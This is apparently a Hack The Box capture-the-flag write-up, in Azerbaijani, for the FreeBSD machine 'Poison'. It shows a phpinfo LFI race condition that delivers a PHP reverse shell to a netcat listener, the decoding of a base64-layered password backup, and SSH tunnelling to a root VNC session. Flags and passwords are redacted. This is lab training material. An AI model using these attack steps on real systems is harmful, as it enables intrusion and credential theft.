# Poison (HTB)

> Platforma: Hack The Box  
> OS: FreeBSD  
> Çətinlik: Orta  
> Nəticə: root

---

## Hücum Zənciri

```text
Kəşfiyyat
├── nmap -sC -sV -A → 22 (OpenSSH 7.2 FreeBSD), 80 (Apache 2.4.29 FreeBSD PHP/5.6.32)
└── / → "Temporary website to test local .php scripts"
    └── Links: ini.php, info.php, listfiles.php, phpinfo.php

İlkin Giriş (LFI Race Condition)
├── listfiles.php → pwdbackup.txt, browse.php
├── phpinfo.php → file_uploads = On (tmp_name offset)
├── phpinfolfi.py (PayloadsAllTheThings) → modifications:
│   ├── LFIREQ: /browse.php?file=%s
│   ├── payload: php reverse shell
│   └── fix bytes vs str (Python 3)
├── nc -lnvp 9001
└── python3 phpinfolfi.py 10.129.1.254 80 100 → www shell

Üfüqi Yerdəyişmə (Credentials)
├── /var/log/httpd-access.log (Apache access log path)
├── ps -aux → Xvnc :1 (root)
├── /usr/local/www/apache24/data/pwdbackup.txt
│   └── 13x base64 decode → <PASSWORD>
└── ssh charix@10.129.1.254 → user.txt

Səlahiyyətlərin Artırılması (VNC)
├── ~/secret.zip → scp → unzip (pass: <PASSWORD>)
├── netstat -an | grep LIST → 5801, 5901 (VNC localhost)
├── ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
├── proxychains4.conf → socks5 127.0.0.1 1080
└── vncviewer -passwd secret 127.0.0.1::6901 → root.txt
```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---

## Maşın Brifinqi

FreeBSD, Apache 2.4.29 + PHP 5.6.32 ilə. Əsas səhifədə test skriptlərinin siyahısı var. VNC server localhost-da root altında işləyir.

---

## Kəşfiyyat

### Port Skanı

```bash
sudo nmap -sC -sV -A -T4 -Pn 10.129.1.254
```

| Port | Xidmət | Versiya                                |
|------|--------|----------------------------------------|
| 22   | SSH    | OpenSSH 7.2 (FreeBSD 20161230)         |
| 80   | HTTP   | Apache httpd 2.4.29 (FreeBSD) PHP/5.6.32 |

OS: FreeBSD 11.x.

---

## İlkin Giriş

### Saytın araşdırılması

```
http://10.129.1.254/
```

Başlıq: "Temporary website to test local .php scripts."

| URL           | Təyinat                                                |
|---------------|--------------------------------------------------------|
| ini.php       | PHP konfiqurasiyasının dump-ı                          |
| info.php      | `uname`                                                |
| listfiles.php | faylların siyahısı → pwdbackup.txt, browse.php         |
| phpinfo.php   | phpinfo, `file_uploads = On`                           |

### LFI Race Condition (phpinfo)

```bash
wget https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/File%20Inclusion/Files/phpinfolfi.py
```

Dəyişikliklər:
- LFIREQ-i `/browse.php?file=%s` ilə əvəz edin
- PHP payload-ı reverse shell ilə əvəz edin
- bytes ilə işləməni düzəldin (Python 3)

Sahələrin yoxlanılması:

```python
i = d.find(b"[tmp_name] =>")
if i == -1:
    i = d.find(b"[tmp_name] =&gt;")
```

Dinləyici:

```bash
nc -lnvp 9001
```

İşə salma:

```bash
python3 phpinfolfi_modifyed.py 10.129.1.254 80 100
```

`www`-dan shell.

### Post-exploitation sadalaması

```bash
hostname
# Poison

ls /var/log
# httpd-access.log, httpd-error.log, ...

cd /home
ls -la
# charix (drwxr-x---)

ps -aux
# Xvnc :1 (root)
```

**"What is the full path to the Apache access logs?" sualına cavab** - `/var/log/httpd-access.log`.

### Giriş məlumatları

```bash
cd /usr/local/www/apache24/data
cat pwdbackup.txt
```

Çoxqatlı base64 (13 dəfə). Dekodlaşdırma:

```bash
for i in $(seq 1 13); do cat pwdbackup.txt | base64 -d > /tmp/step; mv /tmp/step pwdbackup.txt; done
cat pwdbackup.txt
```

Nəticə: `<PASSWORD>`.

### SSH

```bash
ssh charix@10.129.1.254
# Password: <PASSWORD>
cat user.txt
# <USER_FLAG>
```

---

## Səlahiyyətlərin Artırılması

### Ev qovluğundakı fayllar

```bash
ls
# secret.zip
scp charix@10.129.1.254:secret.zip .
unzip secret.zip
# password: <PASSWORD>
```

İçəridə - binary data (VNC parolu).

### VNC-nin aşkar edilməsi

```bash
netstat -an | grep LIST
```

localhost-da 5801 və 5901 portları.

### Tünellemə

`/etc/proxychains4.conf`:

```
socks5  127.0.0.1 1080
```

İşə salma:

```bash
ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
```

### VNC qoşulması

```bash
vncviewer -passwd secret 127.0.0.1::6901
```

VNC vasitəsilə root-un iş masasına çıxış əldə edirik. `root.txt`-i oxuyuruq.

---

## Bayraqlar

| Bayraq | Dəyər                            |
|--------|----------------------------------|
| User   | <USER_FLAG> |
| Root   | (VNC vasitəsilə `/root/root.txt`-ə bax) |

---

## Əsas Nəticələr

- **phpinfo + race condition vasitəsilə LFI** - açıq `phpinfo()` yüklənmiş faylın müvəqqəti yolunu göstərir; tmp faylının yazılması ilə silinməsi arasındakı yarışı qazanmaqla, LFI vasitəsilə onun icrasına nail olmaq mümkündür.
- **Çoxqatlı base64** - sətrin təkrar dekodlanıb-dekodlanmadığını yoxlayın; `for` döngüsündən istifadə edin.
- **Localhost-da VNC** - standart SSH tunnel (`-D` + `-L`) təcrid olunmuş xidmətə çıxış problemini həll edir.
- **secret.zip-də VNC parolu** - SSH çıxışının yanında credential fayllarının saxlanmasının klassik üsulu.
- **Alternativ vektor - log poisoning** - Apache access log User-Agent vasitəsilə oxunub-yazıla bilər, lakin bu halda `www`-dən yazma mümkün deyil, bu da bu yolu istisna edir.
